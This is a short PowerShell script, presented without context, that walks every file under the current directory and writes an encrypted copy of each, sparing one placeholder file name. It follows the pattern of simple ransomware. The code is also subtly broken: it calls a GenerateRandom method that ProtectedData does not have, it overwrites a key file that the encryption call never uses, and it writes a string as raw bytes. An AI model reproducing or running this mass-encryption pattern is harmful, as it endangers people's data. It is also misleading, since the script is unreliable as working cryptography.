$files = Get-ChildItem -File -Recurse

$filesToEncrypt = $files | Where-Object { $_.Name -ne "your file here" }

$filesToEncrypt | ForEach-Object {
    $file = $_
    $key = [System.Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::GenerateRandom(32))
    $keyFilePath = "thekey.key"
    $encryptedFilePath = $file.FullName + ".encrypted"

    # Write the encryption key to the key file
    Set-Content -Path $keyFilePath -Value $key -Encoding Byte

    # Read and encrypt the file contents
    $content = Get-Content -Path $file.FullName -Encoding Byte
    $encryptedContent = [System.Security.Cryptography.ProtectedData]::Protect($content, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # Write the encrypted contents to a new file
    Set-Content -Path $encryptedFilePath -Value $encryptedContent -Encoding Byte
}
